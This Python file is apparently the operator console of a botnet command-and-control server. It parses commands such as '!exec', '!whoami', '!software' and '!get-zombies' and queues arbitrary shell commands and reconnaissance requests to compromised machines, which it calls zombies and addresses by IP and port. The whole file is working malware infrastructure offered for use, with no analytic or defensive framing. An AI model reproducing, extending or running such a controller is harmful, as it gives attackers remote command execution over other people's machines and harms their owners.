#!/usr/bin/env python3

'''
This script is for managing terminal requests
'''

import re
from tkinter import *
from modules.logger import Logger
from random import randint


terminalLogger = Logger(file_name='terminal')


class Terminal:
    def __init__(self, command, server_module):
        self.command = command.strip()
        self.server_module = server_module
        # storing clients sockets and their ips [ip:port,communicator]
        self.zombies_addresses_and_tokens = server_module.zombies_addresses_and_tokens
        self.default_target = server_module.default_target
        self.command_queue_function = self.server_module.queue_new_command

        terminalLogger.log(text='<p>' + self.command + '</p>') # log command entered in terminal

    def interpret_command(self):

        if self.command.startswith('!help'):
            help_msg = '''
!help                   ---> show help
!clear                  ---> clear terminal
!exec "COMMAND"         ---> execute command
!get-qc                 ---> get queued commands which are not sent
Example: !exec "ls" -h "192.168.1.100:49700"
Select Target           ---> -h "TARGET" -h "TARGET2"
!set target "TARGET"    ---> set default target
!get-zombies            ---> get connected zombies
!software               ---> get target installed software
!whoami                 ---> get logged in user
            '''
            terminalLogger.log(text=help_msg)

        elif self.command.startswith('!exec'):
            self.exec_command()

        elif self.command.startswith('!get-zombies'):
            for ac in self.zombies_addresses_and_tokens:
                terminalLogger.log(text=ac[0])

        elif self.command.startswith('!get-qc'):
            for qc in self.server_module.queued_commands:
                terminalLogger.log(
                    text='Zombie : {} , Command : {} , Command ID : {}'.format(qc[0], qc[1], qc[2])
                )

        elif self.command.startswith('!get-os'):
            self.get_os()

        elif self.command.startswith('!software'):
            self.get_software()

        elif self.command.startswith('!whoami'):
            self.get_whomai()

        else:
            first_command = self.command.split(' ')
            if len(first_command) >= 1 :
                first_command = first_command[0]
            elif len(first_command) == 0:
                first_command = self.command

            terminalLogger.log(text='Command {} Not Found! ---> !help for Help'.format(first_command))

    def get_whomai(self):
        target_list = self.find_target_zombie()
        if target_list:
            for target in target_list:
                random_id = self.generate_random_cmd_id()
                self.command_queue_function(
                    command='#special_command:!whoami',
                    zombie_address=target,
                    random_id=random_id
                )
                terminalLogger.log('Command Queued --> Command ID : {}'.format(random_id))

    def get_software(self):
        target_list = self.find_target_zombie()
        if target_list:
            for target in target_list:
                random_id = self.generate_random_cmd_id()
                self.command_queue_function(
                    command='#special_command:!get_software',
                    zombie_address=target,
                    random_id=random_id
                )
                terminalLogger.log('Command Queued --> Command ID : {}'.format(random_id))

    def get_os(self):
        target_list = self.find_target_zombie()
        if target_list:
            for target in target_list:
                random_id = self.generate_random_cmd_id()
                self.command_queue_function(
                    command='#special_command:!get_os',
                    zombie_address=target,
                    random_id=random_id
                )
                terminalLogger.log('Command Queued --> Command ID : {}'.format(random_id))

    def exec_command(self):
        get_command_pattern = r'!exec\s*"(.*?)"'
        command_extracted = re.findall(get_command_pattern, self.command)
        if len(command_extracted) == 1:
            command_extracted = command_extracted[0]
            target_list = self.find_target_zombie()
            if target_list:
                for target in target_list:
                    random_id = self.generate_random_cmd_id()
                    self.command_queue_function(
                        command=command_extracted,
                        zombie_address=target,
                        random_id= random_id
                    )
                    terminalLogger.log('Command Queued --> Command ID : {}'.format(random_id))
        else:
            terminalLogger.log(text='Command Not Found --> example: !exec "ls" -h "192.168.1.1:49520"')

    def find_target_zombie(self):
        # !exec "ls" -h "192.168.10.25:52000"
        get_host_pattern = r' -h "(.*?)"'
        host_from_command = re.findall(get_host_pattern, self.command)
        if len(host_from_command) > 0:
            return host_from_command
        else:
            if self.default_target:
                return [self.default_target]
            else:
                terminalLogger.log('select target --> -h "TARGET"')
                return None

    def generate_random_cmd_id(self):
        random_id = str(randint(1,10000))
        return random_id